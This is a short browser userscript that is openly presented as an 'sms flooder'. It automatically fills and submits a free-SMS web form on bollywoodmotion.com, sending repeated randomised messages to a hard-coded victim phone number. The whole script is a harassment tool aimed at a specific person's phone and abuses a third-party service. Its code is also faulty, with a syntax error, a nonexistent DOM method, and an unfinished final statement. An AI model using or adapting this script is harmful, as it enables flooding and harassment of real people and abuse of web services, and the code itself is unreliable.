// ==UserScript==
// @name          500 char sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*bollywoodmotion.com/*
// ==/UserScript==

var victim=8092262928; 
var msg="FLOODING CHALU HAI"; // Enter delay in milliseconds if required
var urname="HAHA";

if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sms.php"||document.location=="http://bollywoodmotion.com/freesms/sms/sms.php")
{
if(!(document.getElementById('ozpanel_all').style.display=="none";))
{
document.getElementsByName("mv")[0].value=victim;
document.getElementsByName("Message")[0].value=Math.floor(Math.random()*1456484)+"\n"+msg+Math.floor(Math.random()*1456484);
document.getElementsByName("name")[0].value=urname;
void(0);
document.getElementsById("input_2")[0].click();
}
}
if(document.location=="http://www.bollywoodmotion.com/freesms/sms/sendsms.php"||document.location=="http://www.bollywoodmotion.com/freesms/sms/sendsms.php")